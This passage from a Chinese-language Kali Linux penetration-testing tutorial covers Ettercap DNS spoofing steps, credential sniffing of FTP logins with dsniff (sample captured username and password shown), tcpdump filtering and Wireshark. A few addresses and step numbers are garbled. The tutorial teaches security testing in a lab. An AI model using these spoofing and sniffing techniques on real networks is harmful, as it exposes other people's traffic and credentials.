若要以仿图形模式启动它，可在终端中使用下述指令。

  

> \# ettercap -C

  

若要进入Ettercap的图形模式，可在终端中使用下述指令。

  

> \# ettercap -G

  

本例将使用Ettercap程序进行[DNS欺骗](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655116940&idx=2&sn=191df31bd5fb5eb36aa2dd2c22ba4750&chksm=bc8643638bf1ca75b1433f2eeaccff8c416be12d123721099ed95f650442b9db8ba206369ee0&scene=21#wechat_redirect)攻击。各主机采用了前一个例子的配置方法。此外，本例要使用额外的两台主机：IP为192.16S.2.1的DNS服务器；一台诱导被测主机连接的IP地址为192.168.2.22的Web服务器。攻击人员测试主机的IP地址为192.168.2.21。

（1） 进入Ettercap 的图形模式。

  

（2） 在菜单里依次选中Sniff | Unified sniffing，选则相应的网卡，如图25所示。

![](../Images/00cbab5877922e041b39b17d1dc48320.png)

（4） 在菜单中选择Hosts | Hosts list，査看当前联网的主机。

  

（5） 指定要欺骗的主机。本例中，我们选择192.168.2.1（DNS 服务器）作为第一目标。在主机列表中，选中这个IP，然后点击Add to Target 1。接下来，选中192.168.2.22并把它添加为第二目标Add to Target 22，如图26 所示。

![](../Images/5b708f7a1b09ccb3a3b9c83c1b05759a.png)

**四、网络嗅探器**

  

网络嗅探器是监视网络数据的软件程序或硬件设备。人们往往利用它复制网络数据的功能来检测网络数据。借助这类工具，您可以看到网络中正在传输的信息。

  

不久之前，网络嗅探器只是网络工程师用来解决网络问题的工具。但是，它确实可以用来作恶。如果网络数据以明文传输，且计算机之间通过集线器交换数据，那么网络里的通信信息，例如用户名、[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)、邮件内容等，将很容易被他人捕获。幸运的是，如果使用[交换机](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655116832&idx=2&sn=8073a5ac3d4f2c95d4b98d0f8bd8d891&chksm=bc8643cf8bf1cad9bdfbba64126b300212a451ba5f271e5b215bbbf0d2006b1b65596fe0c0b6&scene=21#wechat_redirect)组网，那么捕获数据的难度会高一些，但是他人仍然能够捕获信息。

  

许多工具程序都可用作网络嗅探器。下面将介绍几款[Kali Linux](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118312&idx=1&sn=15a5ce1cda46a23544ef63fac26df032&chksm=bc867e078bf1f71108a1ee28fc7ed7ffd299589427dd3dd166d3b32fe2461eb445e64f0d5590&scene=21#wechat_redirect) 收录了的网络嗅探器。多数情况下，您需要在嗅探数据以前进行[网络欺骗攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655123294&idx=3&sn=2d4b308fe8ca32be8c8e5c3a9bce4b99&chksm=bc866ab18bf1e3a70404c478712bfc9f191070953aec7282b614e61166dc61e51a2c3211b644&scene=21#wechat_redirect)，因为它通常是成功施行网络嗅探的前提。

  

**1、Dsniff**

  

Dsniff 能够在网络中捕获[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。目前，它可从以下协议中捕获[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)：FTP、Telnet、SMTP、HTTP、POP、poppass、NNTP、IMAP、SNMP、LDAP、Rlogin、RIP、OSPF、PPTP MS-CHAP、NFS、VRRP、YP/NIS、SOCKS、X11、CVS、IRC、AIM、ICQ、 Napster、PostgreSQL、Meeting Maker、Citrix ICA、Symantec pcAnywhere、NAI Sniffer、Microsoft SMB、Oracle SQL\*Net、Sybase 以及Microsoft SQL。

  

如需启动dsniff程序，可在终端中使用下述指令。

> \# dsniff -h

  

上述指令将会在屏幕上显示程序的使用说明。我们将使用它捕获FTP [密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。在本例的演示中，FTP客户端的IP是192.168.2.20，服务器IP则是192.168.2.22，这两台主机通过集线器连接。攻击人员的主机IP为192.168.2.21。

  

在攻击人员的测试主机上执行下述指令。

  

> \# dsniff -i eth0 -m

  

其中，选项-i eth0 将使Dsniff 程序监听eth0 网卡。而选项-m 则用于启用程序的自动协议检测功能。

  

然后，在装有FTP客户端程序的主机上，使用客户端程序登录FTP服务器。

  

dsniff的运行结果如下。

  

> dsniff: listening on eth0
> 
> \----------------
> 
> 20/08/13 18:54:53 tcp 192.168.2.20.36761 -> 192.168.2.22.21 (ftp)
> 
> USER user
> 
> PASS user01

  

从中可以看到，dsniff捕获了客户端登录FTP服务器时所用的用户名和[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。

  

**2、tcpdump**

  

tcpdump程序是一款网络嗅探器，它可以捕获符合条件表达式的网络数据包。在没有指定条件表达式的情况下，它会显示所有网络数据包。而在指定条件表达式的情况下，它只会捕获符合条件表达式的数据包。

  

tcpdump还可以将网络数据包存储为文件，或从文件中读取网络数据。

  

如需启动tcpdump程序，可在终端中执行下面这类指令。

  

> \# tcpdump –i eth0 –s 96

  

这个命令将监听eth0 网卡（-i eth0），捕获大小为96 字节（-s 96）的数据包。

  

现在尝试嗅探从IP地址10.0.2.15到10.0.2.100的ICMP封包，这里设置嗅探eth0 接口（-i eth0），不需要把地址转换成主机名（-n），不需要打印时间戳（-t），用十六进制格式和ASCII格式打印封包头和数据（-X）。在主机10.0.2.15处输入：

  

> \# tcpdump -n -t -X -i eth0 –s 64 icmp and src 192.168.56.102 and dst192.168.56.101

  

上述指令的运行结果如图29所示。

![](../Images/669a5ba56c18a52ef2ffb4f5d92981a9.png)

图29

因为指定了条件表达式，tcpdump程序只会显示符合条件表达式的网络数据包。在上述指令中，我们限定程序只显示由IP为192.168.56.102的主机向IP为192.168.56.101的主机发送的ICMP数据包。

  

**3、Wireshark**

  

Wireshark是一个网络协议分析程序。它的图形程序可对它捕获的数据包进行可视化分析，有助于使用人员理解数据包中的各种信息。

  

Wireshark的特征有：

  

● 能够分析1000 多种网络协议；

● 能够实时捕获网络数据包，并能对数据包进行离线分析；

● 它具有业内功能最强大的数据包整理（显示过滤）功能；

● 它的GUI 图形界面程序和命令行程序TShark 都可以显示数据包；

● 支持（读写）多种文件格式的数据包文件。兼容tcpdump（libpcap）、Network GeneralSniffer、Cisco Secure IDS iplog、Microsoft Network Monitor 等程序的文件格式；

● 可从IEEE 802.11、蓝牙、以太网设备实时读取数据；

● 可将结果导出为XML、Postscript、CSV 和文本格式的文件。

  

如需启动 Wireshark 程序，可在桌面菜单中依次选中Kali Linux | Sniffering/Spoofing | Network Sniffers | wireshark，或者在终端中使用下述指令。

  

> \# wireshark

  

上述指令将启动Wireshark网络协议分析程序。如果要捕捉网络数据，可以在Interface List中选择相应的网卡，如图30所示。

**五、结语**

  

本文演示了提升本地权限以及网络嗅探和网络欺骗的具体方法。此处介绍的所有工具都可用来取得更高的访问权限。攻击人员可以通过网络嗅探和网络欺骗手段获得更多的信息，还可能获取进入内网或者外网中其他主机的方式，这些信息中可能含有更具价值的信息。

  

我们最先介绍了本地权限提升[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)的利用方法。在利用被测主机的网络服务[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)之后，我们发现获取的权限很低，接着我们将自己的权限提升为 root 权限。通过本地安全[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)提升权限的技术有很多，这里利用的是内核[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)。

  

接下来，我们阐述了攻击[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的方法。攻击的方法有两种：离线攻击和在线攻击。大多数的离线攻击工具可利用彩虹表提髙破解速度，但同时需要消耗大量的硬盘空间。离线攻击的好处是可以在自己的机器上进行，而无需担心攻击会导致目标机器上的某个账户被封停。在线攻击则可以马上査看攻击结果，但需要小心攻击可能导致目标机器上的某个账户被封停。接着，介绍了多款嗅探网络的工具，最后还介绍了一些可用于[网络欺骗攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655123294&idx=3&sn=2d4b308fe8ca32be8c8e5c3a9bce4b99&chksm=bc866ab18bf1e3a70404c478712bfc9f191070953aec7282b614e61166dc61e51a2c3211b644&scene=21#wechat_redirect)的工具。网络嗅探工具属于被动攻击工具。相比之下，因为网络欺骗工具能够向网络发送数据，所以属于主动攻击工具。
